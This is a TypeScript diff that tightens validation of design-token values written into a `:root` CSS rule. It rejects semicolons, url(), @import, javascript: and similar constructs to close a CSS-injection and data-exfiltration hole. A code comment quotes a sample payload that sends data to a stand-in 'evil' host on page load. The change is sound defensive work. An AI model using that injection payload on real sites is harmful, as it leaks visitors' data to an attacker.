@@ -20,13 +20,27 @@ function esc(s: string): string {
 }
 
 // Design tokens → `:root { --x: y }`. Keys are constrained to a safe CSS-custom-
-// property charset and values stripped of `<`, `>`, `{`, `}` so a token can't
-// break out of the rule or inject markup.
+// property charset; values are held to the SAME bar as atomkit's style `clean()`.
+//
+// Stripping only `<>{}` was not enough: `;` let a token append a second
+// declaration on :root, and `url(` re-opened the CSS-exfiltration channel core
+// explicitly closes — e.g. `"red;background:url(https://evil/?leak)"` fires a
+// request on page load. var() indirection also let a token smuggle url() past
+// core's guard, since core clean()s the literal value, not what var() resolves to.
+// A token is a single CSS value: reject anything that isn't, rather than repair it.
+function tokenValue(v: unknown): string {
+  const s = String(v).trim();
+  if (!s || s.length > 200) return '';
+  if (/[<>{};]/.test(s)) return '';
+  if (/expression\(|javascript:|vbscript:|@import|url\s*\(|image-set\s*\(|cross-fade\s*\(/i.test(s)) return '';
+  return s;
+}
+
 function tokensCss(tokens: Record<string, string>): string {
   const decls = Object.entries(tokens)
     .map(([k, v]) => {
       const name = (k.startsWith('--') ? k : `--${k}`).replace(/[^A-Za-z0-9_-]/g, '');
-      const val = String(v).replace(/[<>{}]/g, '').slice(0, 200);
+      const val = tokenValue(v);
       return name && val ? `${name}:${val}` : '';
     })
     .filter(Boolean)
